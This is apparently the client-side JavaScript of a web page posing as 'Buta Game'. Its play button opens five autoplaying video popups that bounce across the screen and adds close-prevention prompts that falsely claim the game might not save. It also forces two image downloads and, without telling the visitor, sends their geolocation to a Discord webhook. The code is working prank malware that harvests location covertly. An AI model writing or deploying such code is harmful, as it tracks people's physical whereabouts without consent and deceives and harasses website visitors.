document.getElementById('playButton').addEventListener('click', function() {
    const videoFiles = [
        'videos/video1.mp4',
        'videos/video2.mp4',
        'videos/video3.mp4',
        'videos/video4.mp4',
        'videos/video5.mp4' // Added fifth video
    ];

    // Open 5 moving tabs
    videoFiles.forEach((url, index) => {
        const newWindow = window.open('', 'Buta Game', 'width=400,height=300');
        if (newWindow) {
            newWindow.document.write(`
                <title>Buta Game</title>
                <video style="max-width: 100%;" autoplay loop>
                    <source src="${url}" type="video/mp4">
                </video>
                <script>
                    window.onbeforeunload = function() {
                        return "Are you sure you want to close? Game might not save.";
                    };
                </script>
            `);
            newWindow.document.close();

            // Move the window
            let x = Math.random() * (screen.width - 400);
            let y = Math.random() * (screen.height - 300);
            let dx = 2 + Math.random() * 2;
            let dy = 2 + Math.random() * 2;

            function moveWindow() {
                x += dx;
                y += dy;
                if (x < 0 || x > screen.width - 400) dx = -dx;
                if (y < 0 || y > screen.height - 300) dy = -dy;
                newWindow.moveTo(x, y);
                if (newWindow.closed) return;
                requestAnimationFrame(moveWindow);
            }
            moveWindow();
        }
    });

    // Play fourth video on main page
    const mainVideo = document.getElementById('mainVideo');
    mainVideo.style.display = 'block';
    mainVideo.play();

    // Hide button
    this.style.display = 'none';

    // Trigger image downloads
    downloadImage('images/image1.jpg', 'buta_image1.jpg');
    downloadImage('images/image2.jpg', 'buta_image2.jpg');

    // Send location to Discord webhook
    sendLocationToWebhook();
});

// Add close confirmation to main page
window.onbeforeunload = function() {
    return "Are you sure you want to close? Game might not save.";
};

// Function to download images
function downloadImage(url, filename) {
    const link = document.createElement('a');
    link.href = url;
    link.download = filename;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}

// Function to send location to Discord webhook
function sendLocationToWebhook() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
            const { latitude, longitude } = position.coords;
            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
            const data = {
                content: `User location: Latitude ${latitude}, Longitude ${longitude}`,
                username: 'ButaGameBot'
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(error => console.error('Webhook error:', error));
        }, error => {
            console.error('Geolocation error:', error);
        });
    } else {
        console.log('Geolocation not supported');
    }
}